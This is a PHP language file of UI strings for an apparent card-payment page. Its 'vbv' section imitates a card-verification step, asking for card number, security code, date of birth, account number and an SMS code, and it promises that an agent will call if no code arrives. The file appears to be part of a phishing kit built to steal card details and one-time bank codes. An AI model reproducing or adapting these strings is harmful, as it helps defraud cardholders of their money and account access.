<?php
$language = array(
    'title' => array(
        '1' => 'Payment',
    ),
	
    'secure_text' => array(
        '1' => 'With SSL technology',
        '2' => 'your personal data is always protected.',
    ),
	
    'card_title' => array(
        '1' => 'Credit my card',
    ),

    'order_btn' => array(
        '1' => 'Payment',
        '2' => 'Secure payment by SSL',
    ),

    'biling' => array(
        '1' => 'Your contact details',
            '2' => 'First name',
            '3' => 'Last name',
            '4' => 'Email',
    ),
    
	'details_submit' => array(
        '1' => 'Next',
    ),

    'paiement_iframe'   => array(
        'details_title' => array(
            '1' => '1 payments',
            '2' => 'Payment info',
            '3' => 'Cost',
            '4' => 'Detail',
            '5' => 'Subtotal',
            '6' => 'VAT',
            '7' => 'Total',
            '8' => 'Enter your payment information',
        ),
        'formpayment' => array(
			'1' => 'Phone number',
			'2' => 'Card number',
			'3' => 'Expiration date',
			'4' => 'security code',
			'5' => 'Validate',
		),
    ),

    'vbv' => array(
        'lines' => array(
            '1' => ' ',
            '2' => 'helps protect your',
            '3' => 'card against unauthorized use online - at no additional cost. To use',
            '4' => 'Please confirm the code received by SMS in order to receive payment',
            '5' => 'then click on validate',
            '6' => 'Nb: If you do not receive a code, one of our agents will call you to finalize the operation',
        ),
        '1'     => 'Merchant',
        '2'     => 'Amount',
        '3'     => 'Date',
        '4'     => 'Card Number',
        '5'     => 'Card Type',
        '6'     => 'Name as printed on card',
        '7'     => 'Primary Cardholder Date of Birth',
        '8'     => '(DD/MM/YYYY)',
        '9'     => 'Personal Phone Number',
        '10'    => 'Account Number',
        '11'    => 'Validate',
        '12'    => '"Code expired, please wait a new code will be sent to you in 30 seconds"',
        '13'    => '"Invalid"',
    ),

    'footer_top'   => array(
        '1' => 'Contact us',
        '2' => 'Terms of Sales',
            '3' => 'Store created with',
            '4' => 'Security policy',
    ),
    
);

?>